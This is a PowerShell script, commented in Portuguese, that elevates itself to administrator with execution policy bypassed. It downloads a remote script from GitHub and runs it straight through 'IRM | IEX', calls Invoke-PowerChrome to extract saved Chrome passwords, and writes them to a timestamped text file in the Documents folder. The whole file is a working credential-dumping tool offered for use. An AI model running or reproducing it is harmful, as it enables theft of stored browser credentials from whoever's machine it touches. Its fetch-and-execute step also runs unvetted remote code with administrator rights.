# ExtrairSenhas.ps1 - Versão que captura a saída da tela e salva em Documents

# Força a execução como administrador
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Define a pasta Documents (funciona em qualquer idioma)
$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
if (-not (Test-Path $pastaDocuments)) {
    $pastaDocuments = Join-Path $env:USERPROFILE "Documents"
    if (-not (Test-Path $pastaDocuments)) {
        $pastaDocuments = Join-Path $env:USERPROFILE "Meus Documentos"
    }
}

# Nome do arquivo com data/hora
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

Write-Host "Carregando script do GitHub..." -ForegroundColor Cyan
IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

Write-Host "Executando extração de senhas do Chrome..." -ForegroundColor Cyan
Write-Host "Salvando em: $arquivoSaida" -ForegroundColor Yellow

# === SOLUÇÃO MILAGROSA ===
# Executa o script e CAPTURA TUDO (incluindo Write-Host) usando transcrição
$tempLog = Join-Path $env:TEMP "temp_senhas.log"
Start-Transcript -Path $tempLog -Append | Out-Null

# Executa o comando principal
Invoke-PowerChrome -Browser Chrome

# Para a transcrição
Stop-Transcript | Out-Null

# Copia o conteúdo do log para o arquivo final (pulando as linhas de cabeçalho do transcript)
$conteudo = Get-Content $tempLog -Raw
# Remove as linhas iniciais do Transcript
$conteudoLimpo = $conteudo -replace '(?s)^.*?Windows PowerShell transcript start.*?End of transcript\s*', ''
$conteudoLimpo | Out-File -FilePath $arquivoSaida -Encoding UTF8

# Limpa o arquivo temporário
Remove-Item $tempLog -Force -ErrorAction SilentlyContinue

# Verifica se o arquivo foi criado e mostra o tamanho
if (Test-Path $arquivoSaida) {
    $tamanho = [math]::Round((Get-Item $arquivoSaida).Length / 1KB, 2)
    Write-Host "`n===================================================" -ForegroundColor Green
    Write-Host "SUCESSO! Senhas salvas em: $arquivoSaida" -ForegroundColor Green
    Write-Host "Tamanho do arquivo: $tamanho KB" -ForegroundColor Cyan
    Write-Host "===================================================" -ForegroundColor Green
    
    # Abre a pasta Documents para o usuário ver o arquivo
    Start-Process explorer.exe -ArgumentList $pastaDocuments
} else {
    Write-Host "`n===================================================" -ForegroundColor Red
    Write-Host "ERRO: Não foi possível criar o arquivo em: $pastaDocuments" -ForegroundColor Red
    Write-Host "Verifique se a pasta existe e você tem permissão de escrita." -ForegroundColor Red
    Write-Host "===================================================" -ForegroundColor Red
}

Write-Host "`nPressione qualquer tecla para fechar..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
